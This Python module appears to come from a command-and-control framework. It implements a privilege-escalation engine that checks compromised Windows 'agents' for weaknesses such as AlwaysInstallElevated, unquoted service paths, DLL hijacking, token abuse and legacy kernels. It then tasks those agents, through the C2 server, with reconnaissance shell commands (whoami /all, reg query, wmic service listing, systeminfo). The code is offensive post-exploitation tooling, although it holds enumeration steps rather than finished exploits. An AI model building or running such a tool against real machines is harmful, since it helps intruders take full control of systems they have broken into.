import logging
from typing import Dict, List, Optional
from enum import Enum

logger = logging.getLogger(__name__)

class PrivEscTechnique(Enum):
    SERVICE_PATH = "unquoted_service_path"
    ALWAYS_INSTALL_ELEVATED = "always_install_elevated"
    TOKEN_MANIPULATION = "token_manipulation"
    KERNEL_EXPLOIT = "kernel_exploit"
    DLL_HIJACKING = "dll_hijacking"

class PrivEscEngine:
    """
    Automated Privilege Escalation Engine.
    Analyzes system info and suggests/executes escalation vectors.
    """

    def analyze_system(self, system_info: Dict) -> List[Dict]:
        """
        Analyzes agent system info for potential vulnerabilities.
        """
        suggestions = []

        os_name = str(system_info.get("os", "")).lower()
        os_version = str(system_info.get("os_version", "")).lower()
        current_privs = str(system_info.get("privileges", "user")).lower()

        # 1) Legacy platform exposure
        if "windows" in os_name and any(x in os_version for x in ("windows 7", "2008", "2012", "6.1", "6.2")):
            suggestions.append({
                "technique": PrivEscTechnique.KERNEL_EXPLOIT.value,
                "name": "Legacy kernel exploit path",
                "confidence": "MEDIUM",
                "details": "Legacy Windows version detected; validate applicable local privilege escalation CVEs."
            })

        # 2) High privilege context (admin/root)
        if current_privs in {"admin", "administrator", "root", "system"}:
            suggestions.append({
                "technique": PrivEscTechnique.TOKEN_MANIPULATION.value,
                "name": "Token/SID privilege escalation",
                "confidence": "HIGH",
                "details": f"Current privilege context is '{current_privs}', candidate for SYSTEM/root escalation."
            })

        # 3) AlwaysInstallElevated verification from provided registry facts
        registry = system_info.get("registry", {}) if isinstance(system_info.get("registry"), dict) else {}
        hkcu = str(registry.get("HKCU_AlwaysInstallElevated", "")).strip()
        hklm = str(registry.get("HKLM_AlwaysInstallElevated", "")).strip()
        if hkcu == "1" and hklm == "1":
            suggestions.append({
                "technique": PrivEscTechnique.ALWAYS_INSTALL_ELEVATED.value,
                "name": "AlwaysInstallElevated",
                "confidence": "HIGH",
                "details": "Registry keys indicate MSI installation can run elevated."
            })

        # 4) Unquoted service path candidates if service metadata is available
        services = system_info.get("services", [])
        if isinstance(services, list):
            for svc in services:
                if not isinstance(svc, dict):
                    continue
                path = str(svc.get("path", ""))
                writable = bool(svc.get("writable", False))
                if " " in path and not path.strip().startswith('"') and writable:
                    suggestions.append({
                        "technique": PrivEscTechnique.SERVICE_PATH.value,
                        "name": "Unquoted service path",
                        "confidence": "MEDIUM",
                        "details": f"Writable unquoted service path detected: {path}"
                    })
                    break

        return suggestions

    async def exploit_vector(self, agent_id: str, technique: str, c2_server) -> Dict:
        """
        Attempts to exploit a specific vector on an agent.
        """
        logger.info(f"[PrivEsc] Attempting {technique} on {agent_id}")
        
        if technique == PrivEscTechnique.TOKEN_MANIPULATION.value:
            # Verify available token privileges and identity context.
            task_id = await c2_server.submit_task(
                agent_id=agent_id,
                task_type="shell",
                task_data={"command": "whoami /all"},
                priority=1
            )
            return {"status": "initiated", "task_id": task_id, "message": "Collecting token privileges for escalation path"}
            
        elif technique == PrivEscTechnique.ALWAYS_INSTALL_ELEVATED.value:
            cmd = (
                'reg query "HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated && '
                'reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated'
            )
            task_id = await c2_server.submit_task(
                agent_id=agent_id,
                task_type="shell",
                task_data={"command": cmd},
                priority=1
            )
            return {"status": "initiated", "task_id": task_id, "message": "Validating AlwaysInstallElevated registry keys"}

        elif technique == PrivEscTechnique.SERVICE_PATH.value:
            task_id = await c2_server.submit_task(
                agent_id=agent_id,
                task_type="shell",
                task_data={"command": "wmic service get name,displayname,pathname,startmode"},
                priority=1
            )
            return {"status": "initiated", "task_id": task_id, "message": "Enumerating service paths for hijack opportunities"}

        elif technique == PrivEscTechnique.DLL_HIJACKING.value:
            task_id = await c2_server.submit_task(
                agent_id=agent_id,
                task_type="shell",
                task_data={"command": "where /r C:\\ *.dll"},
                priority=1
            )
            return {"status": "initiated", "task_id": task_id, "message": "Enumerating DLL load paths"}

        elif technique == PrivEscTechnique.KERNEL_EXPLOIT.value:
            task_id = await c2_server.submit_task(
                agent_id=agent_id,
                task_type="shell",
                task_data={"command": "systeminfo"},
                priority=1
            )
            return {"status": "initiated", "task_id": task_id, "message": "Collecting kernel/version metadata for exploit matching"}
            
        else:
            return {"status": "failed", "message": f"Unsupported technique: {technique}"}

    def auto_escalate(self, suggestions: List[Dict]) -> Optional[str]:
        """
        Selects the best technique from suggestions.
        """
        # Prioritize HIGH confidence
        for s in suggestions:
            if s["confidence"] == "HIGH":
                return s["technique"]
        return None
